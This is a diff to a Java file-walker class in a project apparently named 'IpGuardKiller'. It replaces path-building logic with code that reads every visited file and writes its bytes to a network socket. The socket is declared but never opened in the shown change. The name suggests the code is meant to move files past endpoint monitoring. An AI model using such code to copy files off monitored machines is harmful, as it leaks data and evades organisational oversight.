@@ -1,5 +1,11 @@
+import sun.misc.IOUtils;
+
 import java.io.File;
+import java.io.FileInputStream;
 import java.io.IOException;
+import java.io.InputStream;
+import java.nio.ByteBuffer;
+import java.nio.channels.SocketChannel;
 import java.nio.file.*;
 import java.nio.file.attribute.BasicFileAttributes;
 import java.util.ArrayList;
@@ -15,6 +21,7 @@ public class FilesTraverse {
 
     public static Path PATH = Paths.get("/home/lin/iproject/IpGuardKiller");
     public static Path prePath = Paths.get("/home/lin/iproject/");
+   static SocketChannel client;
 
     public static void main(String[] args) throws IOException {
 
@@ -38,11 +45,22 @@ public class FilesTraverse {
 
 
 
-                StringBuffer sbf = new StringBuffer();
-                for (int i = prePath.getNameCount(); i < file.getNameCount(); i++) {
-                    sbf.append(file.getName(i).toString() + File.separator);
-                }
-                filesStrRelativePath.add(sbf.toString());
+//                StringBuffer sbf = new StringBuffer();
+//                for (int i = prePath.getNameCount(); i < file.getNameCount(); i++) {
+//                    sbf.append(file.getName(i).toString() + File.separator);
+//                }
+//                filesStrRelativePath.add(sbf.toString());
+
+                    File f = file.toFile();
+
+                InputStream is=new FileInputStream(f);
+                byte[] bytes = IOUtils.readNBytes(is,is.available());
+
+
+                    ByteBuffer buffer = ByteBuffer.wrap(bytes);
+                    client.write(buffer);
+                    buffer.clear();
+
 
                 return super.visitFile(file, attrs);
             }
